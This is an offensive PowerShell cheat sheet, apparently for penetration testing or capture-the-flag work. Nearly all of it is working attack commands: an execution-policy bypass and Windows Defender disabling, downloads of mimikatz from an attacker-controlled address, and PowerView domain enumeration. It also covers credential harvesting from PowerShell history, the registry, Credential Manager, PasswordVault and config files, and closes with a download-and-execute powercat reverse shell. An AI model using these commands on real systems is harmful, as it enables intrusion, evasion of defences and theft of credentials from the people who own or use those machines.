##### Allow Script Execution
```powershell
Set-ExecutionPolicy remotesigned
Set-ExecutionPolicy unrestricted
```

##### Script Execution Bypass
```powershell
powershell.exe -noprofile -executionpolicy bypass -file .\<FILE>.ps1
```

##### Import Module to PowerShell cmdlet
```powershell
import-module ./<module / powershell script>
```

##### Check PowerShell Versions
```powershell
Set-ExecutionPolicy Unrestricted
powershell -Command "$PSVersionTable.PSVersion"
powershell -c "[Environment]::Is64BitProcess"
```

##### Transfer Files
```powershell
(New-Object System.Net.WebClient).DownloadFile("http://10.10.14.4:8000/file.ps1", "C:\users\public\downloads\obf-mimikatz.ps1")

## -UseBasicParsing parameter stops explorer from opening the browser.
Invoke-Webrequest -UseBasicParsing 10.10.14.4:8000/mimikatz.ps1 -OutFile filename.ps1
```

##### Antivirus
```powershell
## Disable Windows Defender real time monitoring
Set-MpPreference -DisableRealTimeMonitoring $true

## Disable Windows Defender scanning for all files downloaded
Set-MpPreference -DisableIOAVProtection $true
```

##### Powerview Domain Enumeration
```powershell
## Get basic information of the domain
Get-NetDomain -Domain <target>

## Get the domains' SID
Get-DomainSID

## Get list of domain controllers
Get-NetDomainController -Domain <target>
```

##### Finding Passwords
```powershell
## Reading the Powershell history (default location)
cat $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

## Find Powershell history if not in \users\username\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine
Get-PSReadlineOption

## Search registry for auto-logon credentials
gp 'HKLM:\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon' | select "Default*"

## Get stored passwords from Windows Credential Manager
Get-StoredCredential | % { write-host -NoNewLine $_.username; write-host -NoNewLine ":" ; $p = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($_.password) ; [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($p); }

## Get stored passwords from Windows PasswordVault
[Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime];(New-Object Windows.Security.Credentials.PasswordVault).RetrieveAll() | % { $_.RetrievePassword();$_ }

## Locate web server configuration files
gci c:\ -Include web.config,applicationHost.config,php.ini,httpd.conf,httpd-xampp.conf,my.ini,my.cnf -File -Recurse -EA SilentlyContinue

## Find database credentials in configuration files
gci c:\ -Include *.config,*.conf,*.xml -File -Recurse -EA SilentlyContinue | Select-String -Pattern "connectionString"

## Find configuration files containing “password” string
gci c:\ -Include *.txt,*.xml,*.config,*.conf,*.cfg,*.ini -File -Recurse -EA SilentlyContinue | Select-String -Pattern "password"

## Find credentials in Sysprep or Unattend files
gci c:\ -Include *sysprep.inf,*sysprep.xml,*sysprep.txt,*unattended.xml,*unattend.xml,*unattend.txt -File -Recurse -EA SilentlyContinue

## Locating files with sensitive information
gci c:\ -Include *pass*.txt,*pass*.xml,*pass*.ini,*pass*.xlsx,*cred*,*vnc*,*.config*,*accounts* -File -Recurse -EA SilentlyContinue

```

##### Reverse shell
```powerhsell
powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<LHOST>/powercat.ps1');powercat -c <LHOST> -p <LPORT> -e cmd"
```